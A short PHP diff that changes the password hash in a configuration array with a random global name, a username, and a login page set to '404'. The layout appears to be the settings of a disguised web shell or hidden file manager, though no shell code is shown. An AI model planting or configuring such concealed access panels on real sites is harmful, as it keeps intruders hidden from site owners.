@@ -8,7 +8,7 @@
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'kucrut',
-    'password' => 'd433239c06b84fab2b6a6fac23be73e0',
+    'password' => '236bf179941ee76fe523007331114515',
     'safe_mode' => '1',
     'login_page' => '404',
     'show_icons' => '1',
